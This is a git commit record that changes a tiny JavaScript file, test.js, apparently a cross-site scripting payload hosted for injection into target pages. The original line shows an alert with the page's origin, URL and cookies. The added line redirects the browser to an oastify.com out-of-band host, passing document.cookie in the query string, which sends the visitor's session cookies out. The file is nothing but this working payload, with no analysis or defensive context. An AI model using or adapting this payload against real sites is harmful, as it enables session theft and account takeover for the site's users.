75439bfebf8697dd65827604dd2913d128eb68bb
PassingCrane <43327842+PassingCrane@users.noreply.github.com>
2024-06-22 16:51:09 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,3 @@
 alert('Wow---! Origin: '+location.origin+'\nUrl: '+top.location.href+'?cookie='+document.cookie);
+
+window.location.href=`https://0312ugjapfbkuniqawy2qucjfal19wxl.oastify.com/?get=`+document.cookie;
